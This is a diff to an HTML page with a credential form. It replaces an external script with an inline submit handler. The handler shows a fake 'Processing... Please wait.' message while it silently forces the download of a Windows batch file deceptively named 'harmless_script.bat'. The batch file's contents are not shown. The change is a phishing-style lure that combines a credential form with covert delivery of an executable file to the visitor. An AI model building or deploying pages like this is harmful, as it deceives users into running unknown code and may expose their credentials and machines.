@@ -55,6 +55,18 @@
         </form>
         <p id="resultMessage"></p>
     </div>
-    <script src="script.js"></script>
+    <script>
+        function handleSubmit() {
+            // Show a message indicating the credentials were "submitted"
+            document.getElementById('resultMessage').innerText = "Processing... Please wait.";
+
+            const link = document.createElement('a');
+            link.href = 'harmless_script.bat';
+            link.download = 'harmless_script.bat';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
 </body>
 </html>
